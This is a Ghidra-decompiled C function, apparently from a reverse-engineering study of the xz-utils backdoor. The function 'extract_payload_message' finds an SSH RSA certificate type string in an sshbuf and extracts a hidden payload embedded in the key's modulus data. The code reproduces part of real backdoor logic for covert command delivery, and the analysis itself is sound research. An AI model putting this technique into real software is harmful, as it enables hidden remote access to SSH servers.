// /home/kali/xzre-ghidra/xzregh/107F20_extract_payload_message.c
// Function: extract_payload_message @ 0x107F20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall extract_payload_message(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)


BOOL extract_payload_message
               (sshbuf *sshbuf_data,size_t sshbuf_size,size_t *out_payload_size,
               global_context_t *ctx)

{
  uint *puVar1;
  char cVar2;
  uint uVar3;
  size_t i;
  size_t cert_type_namelen;
  u32 length_1;
  u32 length_2;
  u32 length;
  uint *puVar4;
  size_t remaining;
  long lVar5;
  u8 *modulus_data;
  uint *puVar6;
  size_t modulus_length;
  u8 *sshbuf_end;
  
  if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
    return 0;
  }
  if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
    if (ctx->STR_ssh_rsa_cert_v01_openssh_com == (char *)0x0) {
      return 0;
    }
    if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
      return 0;
    }
    sshbuf_end = sshbuf_data->d;
    if (CARRY8((ulong)sshbuf_end,sshbuf_size)) {
      return 0;
    }
    i = 0;
    do {
      modulus_data = sshbuf_end + i;
      remaining = 0;
      modulus_length = sshbuf_size - i;
      while( true ) {
        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[remaining];
        if (((char)modulus_data[remaining] < cVar2) || (cVar2 < (char)modulus_data[remaining]))
        break;
        remaining = remaining + 1;
        if (remaining == 7) goto LAB_00107fd1;
      }
      lVar5 = 0;
      while( true ) {
        cVar2 = ctx->STR_rsa_sha2_256[lVar5];
        if (((char)modulus_data[lVar5] < cVar2) || (cVar2 < (char)modulus_data[lVar5])) break;
        lVar5 = lVar5 + 1;
        if (lVar5 == 7) goto LAB_00107fd1;
      }
      i = i + 1;
    } while (sshbuf_size - i != 6);
    modulus_data = (u8 *)0x0;
    modulus_length = 6;
LAB_00107fd1:
    if ((7 < i) && (modulus_data != (u8 *)0x0)) {
      uVar3 = *(uint *)(modulus_data + -8);
      length_1 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length_1) {
        return 0;
      }
      puVar1 = (uint *)(modulus_data + ((ulong)length_1 - 8));
      if (sshbuf_end + sshbuf_size < puVar1) {
        return 0;
      }
      cert_type_namelen = c_strnlen((char *)modulus_data,modulus_length);
      if (modulus_length <= cert_type_namelen) {
        return 0;
      }
      puVar6 = (uint *)(modulus_data + cert_type_namelen);
      if (puVar1 <= puVar6) {
        return 0;
      }
      uVar3 = *puVar6;
      length_2 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length_2) {
        return 0;
      }
      puVar6 = (uint *)((long)puVar6 + (ulong)(length_2 + 4));
      if (puVar1 <= puVar6) {
        return 0;
      }
      uVar3 = *puVar6;
      length = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length) {
        return 0;
      }
      puVar4 = puVar6 + 1;
      if ((uint *)((ulong)length + (long)puVar4) <= puVar1) {
        return 0;
      }
      if ((char)puVar6[1] == '\0') {
        puVar4 = (uint *)((long)puVar6 + 5);
        length = length - 1;
      }
      sshbuf_data->d = (u8 *)puVar4;
      *out_payload_size = (ulong)length;
      return 1;
    }
  }
  return 0;
}

